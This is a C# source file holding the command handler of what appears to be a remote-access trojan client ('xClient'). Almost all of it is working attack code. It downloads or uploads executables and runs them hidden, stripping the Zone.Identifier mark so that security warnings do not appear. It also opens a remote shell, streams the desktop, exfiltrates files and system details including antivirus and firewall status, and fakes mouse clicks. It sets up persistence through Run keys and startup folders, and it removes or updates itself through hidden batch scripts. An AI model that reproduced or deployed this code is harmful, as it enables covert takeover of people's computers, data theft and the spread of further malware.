using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using xClient.Config;
using xClient.Core.Helper;
using xClient.Core.Packets.ClientPackets;
using xClient.Core.Packets.ServerPackets;
using xClient.Core.RemoteShell;
using Directory = xClient.Core.Packets.ServerPackets.Directory;

namespace xClient.Core.Commands
{
    public static class CommandHandler
    {
        private const int MOUSEEVENTF_LEFTDOWN = 0x02;
        private const int MOUSEEVENTF_LEFTUP = 0x04;
        private const int MOUSEEVENTF_RIGHTDOWN = 0x08;
        private const int MOUSEEVENTF_RIGHTUP = 0x10;
        private const string DELIMITER = "$E$";
        public static UnsafeStreamCodec StreamCodec;
        public static Bitmap LastDesktopScreenshot;
        private static Shell _shell;
        private static readonly Dictionary<int, string> _cancledDownloads = new Dictionary<int, string>();

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool DeleteFile(string name);

        [DllImport("user32.dll")]
        private static extern bool SetCursorPos(int x, int y);

        [DllImport("user32.dll")]
        private static extern void mouse_event(int dwFlags, int dx, int dy, int cButtons, int dwExtraInfo);

        public static void HandleInitializeCommand(InitializeCommand command, Client client)
        {
            SystemCore.InitializeGeoIp();
            new Initialize(Settings.VERSION, SystemCore.OperatingSystem, SystemCore.AccountType, SystemCore.Country,
                SystemCore.CountryCode, SystemCore.Region, SystemCore.City, SystemCore.ImageIndex, SystemCore.GetId())
                .Execute(client);
        }

        public static void HandleDownloadAndExecuteCommand(DownloadAndExecute command, Client client)
        {
            new Status("Downloading file...").Execute(client);

            new Thread(() =>
            {
                var tempFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    Helper.Helper.GetRandomFilename(12, ".exe"));

                try
                {
                    using (var c = new WebClient())
                    {
                        c.Proxy = null;
                        c.DownloadFile(command.URL, tempFile);
                    }
                }
                catch
                {
                    new Status("Download failed!").Execute(client);
                    return;
                }

                new Status("Downloaded File!").Execute(client);

                try
                {
                    DeleteFile(tempFile + ":Zone.Identifier");

                    var bytes = File.ReadAllBytes(tempFile);
                    if (bytes[0] != 'M' && bytes[1] != 'Z')
                        throw new Exception("no pe file");

                    var startInfo = new ProcessStartInfo();
                    if (command.RunHidden)
                    {
                        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        startInfo.CreateNoWindow = true;
                    }
                    startInfo.UseShellExecute = command.RunHidden;
                    startInfo.FileName = tempFile;
                    Process.Start(startInfo);
                }
                catch
                {
                    DeleteFile(tempFile);
                    new Status("Execution failed!").Execute(client);
                    return;
                }

                new Status("Executed File!").Execute(client);
            }).Start();
        }

        public static void HandleUploadAndExecute(UploadAndExecute command, Client client)
        {
            //TODO: rework like DownloadFile
            new Thread(() =>
            {
                var tempFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    command.FileName);

                try
                {
                    if (command.FileBytes[0] != 'M' && command.FileBytes[1] != 'Z')
                        throw new Exception("no pe file");

                    File.WriteAllBytes(tempFile, command.FileBytes);

                    DeleteFile(tempFile + ":Zone.Identifier");

                    var startInfo = new ProcessStartInfo();
                    if (command.RunHidden)
                    {
                        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        startInfo.CreateNoWindow = true;
                    }
                    startInfo.UseShellExecute = command.RunHidden;
                    startInfo.FileName = tempFile;
                    Process.Start(startInfo);
                }
                catch
                {
                    DeleteFile(tempFile);
                    new Status("Execution failed!").Execute(client);
                    return;
                }

                new Status("Executed File!").Execute(client);
            }).Start();
        }

        public static void HandleUninstall(Uninstall command, Client client)
        {
            new Status("Uninstalling... bye ;(").Execute(client);

            if (Settings.STARTUP)
            {
                if (SystemCore.AccountType == "Admin")
                {
                    try
                    {
                        using (
                            var key =
                                Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                                    true))
                        {
                            if (key != null)
                            {
                                key.DeleteValue(Settings.STARTUPKEY, true);
                                key.Close();
                            }
                        }
                    }
                    catch
                    {
                        // try deleting from Registry.CurrentUser
                        using (
                            var key =
                                Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                                    true))
                        {
                            if (key != null)
                            {
                                key.DeleteValue(Settings.STARTUPKEY, true);
                                key.Close();
                            }
                        }
                    }
                }
                else
                {
                    try
                    {
                        using (
                            var key =
                                Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                                    true))
                        {
                            if (key != null)
                            {
                                key.DeleteValue(Settings.STARTUPKEY, true);
                                key.Close();
                            }
                        }
                    }
                    catch
                    {
                    }
                }
            }

            try
            {
                var filename = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    Helper.Helper.GetRandomFilename(12, ".bat"));

                var uninstallBatch = (Settings.INSTALL && Settings.HIDEFILE)
                    ? "@echo off" + "\n" +
                      "echo DONT CLOSE THIS WINDOW!" + "\n" +
                      "ping -n 20 localhost > nul" + "\n" +
                      "del /A:H " + "\"" + SystemCore.MyPath + "\"" + "\n" +
                      "del " + "\"" + filename + "\""
                    : "@echo off" + "\n" +
                      "echo DONT CLOSE THIS WINDOW!" + "\n" +
                      "ping -n 20 localhost > nul" + "\n" +
                      "del " + "\"" + SystemCore.MyPath + "\"" + "\n" +
                      "del " + "\"" + filename + "\""
                    ;

                File.WriteAllText(filename, uninstallBatch);
                var startInfo = new ProcessStartInfo
                {
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    UseShellExecute = true,
                    FileName = filename
                };
                Process.Start(startInfo);
            }
            finally
            {
                SystemCore.Disconnect = true;
                client.Disconnect();
            }
        }

        public static void HandleRemoteDesktop(Desktop command, Client client)
        {
            if (StreamCodec == null || StreamCodec.ImageQuality != command.Quality)
                StreamCodec = new UnsafeStreamCodec(command.Quality);

            LastDesktopScreenshot = Helper.Helper.GetDesktop(command.Number);
            var bmpdata = LastDesktopScreenshot.LockBits(
                new Rectangle(0, 0, LastDesktopScreenshot.Width, LastDesktopScreenshot.Height), ImageLockMode.ReadWrite,
                LastDesktopScreenshot.PixelFormat);

            using (var stream = new MemoryStream())
            {
                StreamCodec.CodeImage(bmpdata.Scan0,
                    new Rectangle(0, 0, LastDesktopScreenshot.Width, LastDesktopScreenshot.Height),
                    new Size(LastDesktopScreenshot.Width, LastDesktopScreenshot.Height),
                    LastDesktopScreenshot.PixelFormat,
                    stream);
                new DesktopResponse(stream.ToArray(), StreamCodec.ImageQuality).Execute(client);
            }

            LastDesktopScreenshot.UnlockBits(bmpdata);
            LastDesktopScreenshot.Dispose();
        }

        public static void HandleGetProcesses(GetProcesses command, Client client)
        {
            var pList = Process.GetProcesses();
            var processes = new string[pList.Length];
            var ids = new int[pList.Length];
            var titles = new string[pList.Length];

            var i = 0;
            foreach (var p in pList)
            {
                processes[i] = p.ProcessName + ".exe";
                ids[i] = p.Id;
                titles[i] = p.MainWindowTitle;
                i++;
            }

            new GetProcessesResponse(processes, ids, titles).Execute(client);
        }

        public static void HandleKillProcess(KillProcess command, Client client)
        {
            try
            {
                Process.GetProcessById(command.PID).Kill();
            }
            catch
            {
            }

            HandleGetProcesses(new GetProcesses(), client);
        }

        public static void HandleStartProcess(StartProcess command, Client client)
        {
            var startInfo = new ProcessStartInfo {UseShellExecute = true, FileName = command.Processname};
            Process.Start(startInfo);

            HandleGetProcesses(new GetProcesses(), client);
        }

        public static void HandleDrives(Drives command, Client client)
        {
            new DrivesResponse(Environment.GetLogicalDrives()).Execute(client);
        }

        public static void HandleDirectory(Directory command, Client client)
        {
            try
            {
                var dicInfo = new DirectoryInfo(command.RemotePath);

                var iFiles = dicInfo.GetFiles();
                var iFolders = dicInfo.GetDirectories();

                var files = new string[iFiles.Length];
                var filessize = new long[iFiles.Length];
                var folders = new string[iFolders.Length];

                var i = 0;
                foreach (var file in iFiles)
                {
                    files[i] = file.Name;
                    filessize[i] = file.Length;
                    i++;
                }
                if (files.Length == 0)
                {
                    files = new[] {DELIMITER};
                    filessize = new long[] {0};
                }

                i = 0;
                foreach (var folder in iFolders)
                {
                    folders[i] = folder.Name;
                    i++;
                }
                if (folders.Length == 0)
                    folders = new[] {DELIMITER};

                new DirectoryResponse(files, folders, filessize).Execute(client);
            }
            catch
            {
                new DirectoryResponse(new[] {DELIMITER}, new[] {DELIMITER}, new long[] {0}).Execute(client);
            }
        }

        public static void HandleDownloadFile(DownloadFile command, Client client)
        {
            new Thread(() =>
            {
                try
                {
                    var srcFile = new FileSplit(command.RemotePath);
                    if (srcFile.MaxBlocks < 0)
                        new DownloadFileResponse(command.ID, "", new byte[0], -1, -1, srcFile.LastError).Execute(client);

                    for (var currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
                    {
                        if (_cancledDownloads.ContainsKey(command.ID)) return;

                        byte[] block;
                        if (srcFile.ReadBlock(currentBlock, out block))
                        {
                            new DownloadFileResponse(command.ID, Path.GetFileName(command.RemotePath), block,
                                srcFile.MaxBlocks, currentBlock, srcFile.LastError).Execute(client);
                            //Thread.Sleep(200);
                        }
                        else
                            new DownloadFileResponse(command.ID, "", new byte[0], -1, -1, srcFile.LastError).Execute(
                                client);
                    }
                }
                catch (Exception ex)
                {
                    new DownloadFileResponse(command.ID, "", new byte[0], -1, -1, ex.Message).Execute(client);
                }
            }).Start();
        }

        public static void HandleDownloadFileCanceled(DownloadFileCanceled command, Client client)
        {
            if (!_cancledDownloads.ContainsKey(command.ID))
            {
                _cancledDownloads.Add(command.ID, "canceled");
                new DownloadFileResponse(command.ID, "", new byte[0], -1, -1, "Canceled").Execute(client);
            }
        }

        public static void HandleMouseClick(MouseClick command, Client client)
        {
            if (command.LeftClick)
            {
                SetCursorPos(command.X, command.Y);
                mouse_event(MOUSEEVENTF_LEFTDOWN, command.X, command.Y, 0, 0);
                mouse_event(MOUSEEVENTF_LEFTUP, command.X, command.Y, 0, 0);
                if (command.DoubleClick)
                {
                    mouse_event(MOUSEEVENTF_LEFTDOWN, command.X, command.Y, 0, 0);
                    mouse_event(MOUSEEVENTF_LEFTUP, command.X, command.Y, 0, 0);
                }
            }
            else
            {
                SetCursorPos(command.X, command.Y);
                mouse_event(MOUSEEVENTF_RIGHTDOWN, command.X, command.Y, 0, 0);
                mouse_event(MOUSEEVENTF_RIGHTUP, command.X, command.Y, 0, 0);
                if (command.DoubleClick)
                {
                    mouse_event(MOUSEEVENTF_RIGHTDOWN, command.X, command.Y, 0, 0);
                    mouse_event(MOUSEEVENTF_RIGHTUP, command.X, command.Y, 0, 0);
                }
            }
        }

        public static void HandleGetSystemInfo(GetSystemInfo command, Client client)
        {
            try
            {
                string[] infoCollection =
                {
                    "Processor (CPU)",
                    SystemCore.GetCpu(),
                    "Memory (RAM)",
                    string.Format("{0} MB", SystemCore.GetRam()),
                    "Video Card (GPU)",
                    SystemCore.GetGpu(),
                    "Username",
                    SystemCore.GetUsername(),
                    "PC Name",
                    SystemCore.GetPcName(),
                    "Uptime",
                    SystemCore.GetUptime(),
                    "MAC Address",
                    SystemCore.GetMacAddress(),
                    "LAN IP Address",
                    SystemCore.GetLanIp(),
                    "WAN IP Address",
                    SystemCore.WanIp,
                    "Antivirus",
                    SystemCore.GetAntivirus(),
                    "Firewall",
                    SystemCore.GetFirewall()
                };

                new GetSystemInfoResponse(infoCollection).Execute(client);
            }
            catch
            {
            }
        }

        public static void HandleVisitWebsite(VisitWebsite command, Client client)
        {
            var url = command.URL;

            if (!url.StartsWith("http"))
                url = "http://" + url;

            if (Uri.IsWellFormedUriString(url, UriKind.RelativeOrAbsolute))
            {
                if (!command.Hidden)
                    Process.Start(url);
                else
                {
                    try
                    {
                        var request = (HttpWebRequest) WebRequest.Create(url);
                        request.UserAgent =
                            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.114 Safari/537.36";
                        request.AllowAutoRedirect = true;
                        request.Timeout = 10000;
                        request.Method = "GET";

                        using (var response = (HttpWebResponse) request.GetResponse())
                        {
                            using (var dataStream = response.GetResponseStream())
                            {
                                using (var reader = new StreamReader(dataStream))
                                {
                                }
                            }
                        }
                    }
                    catch
                    {
                    }
                }

                new Status("Visited Website").Execute(client);
            }
        }

        public static void HandleShowMessageBox(ShowMessageBox command, Client client)
        {
            MessageBox.Show(null, command.Text, command.Caption,
                (MessageBoxButtons) Enum.Parse(typeof (MessageBoxButtons), command.MessageboxButton),
                (MessageBoxIcon) Enum.Parse(typeof (MessageBoxIcon), command.MessageboxIcon));
            new Status("Showed Messagebox").Execute(client);
        }

        public static void HandleUpdate(Update command, Client client)
        {
            // i dont like this updating... if anyone has a better idea feel free to edit it
            new Status("Downloading file...").Execute(client);

            new Thread(() =>
            {
                var tempFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    Helper.Helper.GetRandomFilename(12, ".exe"));

                try
                {
                    using (var c = new WebClient())
                    {
                        c.Proxy = null;
                        c.DownloadFile(command.DownloadURL, tempFile);
                    }
                }
                catch
                {
                    new Status("Download failed!").Execute(client);
                    return;
                }

                new Status("Downloaded File!").Execute(client);

                new Status("Updating...").Execute(client);

                try
                {
                    DeleteFile(tempFile + ":Zone.Identifier");

                    var bytes = File.ReadAllBytes(tempFile);
                    if (bytes[0] != 'M' && bytes[1] != 'Z')
                        throw new Exception("no pe file");

                    var filename = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                        Helper.Helper.GetRandomFilename(12, ".bat"));

                    var uninstallBatch = (Settings.INSTALL && Settings.HIDEFILE)
                        ? "@echo off" + "\n" +
                          "echo DONT CLOSE THIS WINDOW!" + "\n" +
                          "ping -n 20 localhost > nul" + "\n" +
                          "del /A:H " + "\"" + SystemCore.MyPath + "\"" + "\n" +
                          "move " + "\"" + tempFile + "\"" + " " + "\"" + SystemCore.MyPath + "\"" + "\n" +
                          "start \"\" " + "\"" + SystemCore.MyPath + "\"" + "\n" +
                          "del " + "\"" + filename + "\""
                        : "@echo off" + "\n" +
                          "echo DONT CLOSE THIS WINDOW!" + "\n" +
                          "ping -n 20 localhost > nul" + "\n" +
                          "del " + "\"" + SystemCore.MyPath + "\"" + "\n" +
                          "move " + "\"" + tempFile + "\"" + " " + "\"" + SystemCore.MyPath + "\"" + "\n" +
                          "start \"\" " + "\"" + SystemCore.MyPath + "\"" + "\n" +
                          "del " + "\"" + filename + "\""
                        ;

                    File.WriteAllText(filename, uninstallBatch);
                    var startInfo = new ProcessStartInfo();
                    startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    startInfo.CreateNoWindow = true;
                    startInfo.UseShellExecute = true;
                    startInfo.FileName = filename;
                    Process.Start(startInfo);

                    SystemCore.Disconnect = true;
                    client.Disconnect();
                }
                catch
                {
                    DeleteFile(tempFile);
                    new Status("Update failed!").Execute(client);
                }
            }).Start();
        }

        public static void HandleMonitors(Monitors command, Client client)
        {
            new MonitorsResponse(Screen.AllScreens.Length).Execute(client);
        }

        public static void HandleShellCommand(ShellCommand command, Client client)
        {
            if (_shell == null)
                _shell = new Shell();

            var input = command.Command;

            if (input == "exit")
                CloseShell();
            else
                _shell.ExecuteCommand(input);
        }

        public static void CloseShell()
        {
            if (_shell != null)
            {
                _shell.CloseSession();
                _shell = null;
            }
        }

        public static void HandleRename(Rename command, Client client)
        {
            try
            {
                if (command.IsDir)
                    System.IO.Directory.Move(command.Path, command.NewPath);
                else
                    File.Move(command.Path, command.NewPath);

                HandleDirectory(new Directory(Path.GetDirectoryName(command.NewPath)), client);
            }
            catch
            {
            }
        }

        public static void HandleDelete(Delete command, Client client)
        {
            try
            {
                if (command.IsDir)
                    System.IO.Directory.Delete(command.Path, true);
                else
                    File.Delete(command.Path);

                HandleDirectory(new Directory(Path.GetDirectoryName(command.Path)), client);
            }
            catch
            {
            }
        }

        public static void HandleAction(Action command, Client client)
        {
            try
            {
                var startInfo = new ProcessStartInfo();
                switch (command.Mode)
                {
                    case 0:
                        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        startInfo.CreateNoWindow = true;
                        startInfo.UseShellExecute = true;
                        startInfo.Arguments = "/s /t 0"; // shutdown
                        startInfo.FileName = "shutdown";
                        Process.Start(startInfo);
                        break;

                    case 1:
                        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        startInfo.CreateNoWindow = true;
                        startInfo.UseShellExecute = true;
                        startInfo.Arguments = "/r /t 0"; // restart
                        startInfo.FileName = "shutdown";
                        Process.Start(startInfo);
                        break;

                    case 2:
                        Application.SetSuspendState(PowerState.Suspend, true, true); // standby
                        break;
                }
            }
            catch
            {
                new Status("Action failed!").Execute(client);
            }
        }

        public static void HandleGetStartupItems(GetStartupItems command, Client client)
        {
            try
            {
                var startupItems = new Dictionary<string, int>();

                using (
                    var key = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                        false))
                {
                    if (key != null)
                    {
                        foreach (var k in key.GetValueNames())
                            startupItems.Add(string.Format("{0}||{1}", k, key.GetValue(k)), 0);
                    }
                }
                using (
                    var key = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
                        false))
                {
                    if (key != null)
                    {
                        foreach (var k in key.GetValueNames())
                            startupItems.Add(string.Format("{0}||{1}", k, key.GetValue(k)), 1);
                    }
                }
                using (
                    var key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", false)
                    )
                {
                    if (key != null)
                    {
                        foreach (var k in key.GetValueNames())
                            startupItems.Add(string.Format("{0}||{1}", k, key.GetValue(k)), 2);
                    }
                }
                using (
                    var key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
                        false))
                {
                    if (key != null)
                    {
                        foreach (var k in key.GetValueNames())
                            startupItems.Add(string.Format("{0}||{1}", k, key.GetValue(k)), 3);
                    }
                }
                if (
                    System.IO.Directory.Exists(
                        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
                            "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")))
                {
                    var files =
                        new DirectoryInfo(
                            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
                                "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")).GetFiles();
                    foreach (var file in files)
                        startupItems.Add(string.Format("{0}||{1}", file.Name, file.FullName), 4);
                }
                if (
                    System.IO.Directory.Exists(
                        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                            "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")))
                {
                    var files =
                        new DirectoryInfo(
                            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                                "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")).GetFiles();
                    foreach (var file in files)
                        startupItems.Add(string.Format("{0}||{1}", file.Name, file.FullName), 5);
                }

                new GetStartupItemsResponse(startupItems).Execute(client);
            }
            catch
            {
                new Status("Startup Information failed!").Execute(client);
            }
        }

        public static void HandleAddStartupItem(AddStartupItem command, Client client)
        {
            try
            {
                switch (command.Type)
                {
                    case 0:
                        using (
                            var key =
                                Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                                    true))
                        {
                            if (key == null) throw new Exception();
                            if (!command.Path.StartsWith("\"") && !command.Path.EndsWith("\""))
                                command.Path = "\"" + command.Path + "\"";
                            key.SetValue(command.Name, command.Path);
                        }
                        break;

                    case 1:
                        using (
                            var key =
                                Registry.LocalMachine.OpenSubKey(
                                    "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", true))
                        {
                            if (key == null) throw new Exception();
                            if (!command.Path.StartsWith("\"") && !command.Path.EndsWith("\""))
                                command.Path = "\"" + command.Path + "\"";
                            key.SetValue(command.Name, command.Path);
                        }
                        break;

                    case 2:
                        using (
                            var key =
                                Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                                    true))
                        {
                            if (key == null) throw new Exception();
                            if (!command.Path.StartsWith("\"") && !command.Path.EndsWith("\""))
                                command.Path = "\"" + command.Path + "\"";
                            key.SetValue(command.Name, command.Path);
                        }
                        break;

                    case 3:
                        using (
                            var key =
                                Registry.CurrentUser.OpenSubKey(
                                    "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", true))
                        {
                            if (key == null) throw new Exception();
                            if (!command.Path.StartsWith("\"") && !command.Path.EndsWith("\""))
                                command.Path = "\"" + command.Path + "\"";
                            key.SetValue(command.Name, command.Path);
                        }
                        break;

                    case 4:
                        if (
                            !System.IO.Directory.Exists(
                                Path.Combine(
                                    Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
                                    "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")))
                            throw new Exception();

                        var lnkPath =
                            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
                                "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + command.Name + ".url");

                        using (var writer = new StreamWriter(lnkPath, false))
                        {
                            writer.WriteLine("[InternetShortcut]");
                            writer.WriteLine("URL=file:///" + command.Path);
                            writer.WriteLine("IconIndex=0");
                            writer.WriteLine("IconFile=" + command.Path.Replace('\\', '/'));
                            writer.Flush();
                        }
                        break;

                    case 5:
                        if (
                            !System.IO.Directory.Exists(
                                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                                    "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")))
                            throw new Exception();

                        var lnkPath2 = Path.Combine(
                            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                            "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + command.Name + ".url");

                        using (var writer = new StreamWriter(lnkPath2, false))
                        {
                            writer.WriteLine("[InternetShortcut]");
                            writer.WriteLine("URL=file:///" + command.Path);
                            writer.WriteLine("IconIndex=0");
                            writer.WriteLine("IconFile=" + command.Path.Replace('\\', '/'));
                            writer.Flush();
                        }
                        break;
                }
            }
            catch
            {
                new Status("Adding Autostart Item failed!").Execute(client);
            }
        }
    }
}